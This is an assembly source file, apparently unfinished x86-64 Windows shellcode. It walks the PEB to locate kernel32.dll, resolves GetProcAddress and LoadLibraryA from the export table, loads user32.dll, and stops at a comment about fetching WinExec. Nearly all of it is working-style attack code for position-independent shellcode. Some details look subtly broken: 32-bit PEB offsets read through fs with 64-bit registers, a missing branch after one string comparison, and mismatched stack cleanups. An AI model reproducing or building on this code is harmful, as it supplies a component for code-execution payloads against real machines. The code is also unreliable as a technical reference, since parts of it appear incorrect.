;https://www.felixcloutier.com/x86/lods:lodsb:lodsw:lodsd:lodsq

global _start

section .text
_start:

	; Find the kernel32.dll base address
	xor rcx, rcx                           ; zero rcx 
	mov rax, fs:[rcx + 0x60]               ; rax = PEB   fs is a segment reg pointing at TEB
	mov rax, [rax + 0x14]                  ; rax = PEB->LDR
	mov rsi, [rax + 0x20]                  ; rsi = PEB->LDR->InMemoryOrderModuleList linked list of loaded modules
	lodsq                                  ; rax = Second Module (generally ntdll.dll)
	xchg rsi, rax                          ; rsi = Second Module, rax = PEM->LDR->InMemOrd 
	lodsq                                  ; rax = Third Module (generally kernel32.dll)
	mov rbx, [rax + 0x20]                  ; rbx = DLLbase of kernel32.dll

	; Find the export table of kernerl32.dll (Data Directory in PE header)
	mov rdx, [rbx + 0x3c]                  ; rdx = e_lfanew in DOS header
	add rdx, rbx                           ; rdx = PE header
	mov rdx, [rdx + 0x78]                  ; rdx = Export Directory (relative virtual address)
	add rdx, rbx                           ; rdx = Export Directory
	mov rsi, [rdx + 0x20]                  ; rsi = Offset to Address of Names Table (relative virtual address)
	add rsi, rbx                           ; rsi = Address of Names Array
	xor rcx, rcx                           ; rcx = 0

	; Walking the Address Names array to find GetProcAddress (puts element index of GetProcAddress in rcx)
	Get_Function:
	inc rcx                                ; Increment the ordinal
	lodsq                                  ; rax = rsi (Address of Names)
	add rax, rbx                           ; Get Function name
	cmp dword ptr[rax], 0x50746547         ; Compare GetP
	jnz Get_Function
	cmp dword ptr[rax + 0x4], 0x41636f72   ; Compare rocA
	jnz Get_Function
	cmp dword ptr[rax + 0x8], 0x65726464   ; Compare ddre

	; Find address of GetProcAddress Function
	mov rsi, [rdx + 0x24]                  ; rsi = Offset to Array of Ordinals
	add rsi, rbx                           ; rsi = Ordinals array 
	mov cx, [rsi + rcx * 2]                ; cx = ordinal of function 
	dec rcx
	mov rsi, [rdx + 0x1c]                  ; rsi = Offset to Array of Functions
	add rsi, rbx                           ; rsi = Functions Array
	mov rdx, [rsi + rcx * 8]               ; rdx = GetProcAddress (offset)
	add rdx, rbx                           ; rdx = GetProcAddress

	; rdx = GetProcAddress, rbx = kernel32.dll base addr
	; Find LoadLibrary function
	push 0x41797261                        ; push "aryA"
	push 0x7262694c64616f4c                ; push "LoadLibr"
	mov rcx, rbx                           ; parameter1 = kernerl32.dll base addr
	mov rbx, rdx                           ; mov GetProcAddress to rax 
	mov rdx, rsp                           ; parameter2 = "LoadLibraryA"
	call rbx                               ; Call GetProcAddress()

	; rcx = kernel32.dll base addr 
	; rbx = GetProcAddress()
	; rax = LoadLibraryA function Addr
	; Load user32.dll library
	add rsp, 0xc                           ; pop "LoadLibraryA"
	push rax                               ; push LoadLibraryA
	push 0x6c6c                            ; push "ll"
	push 0x642e323372657375                ; push "user32.d"
	mov rdx, rcx                           ; mov kernel32.dll base addr to rdx
	mov rcx, rsp                           ; parameter1 = user32.dll
	call rax                               ; call LoadLibraryA()

	; Get WinExec
	add rsp, 0xa                           ; pop "user32.dll"
	
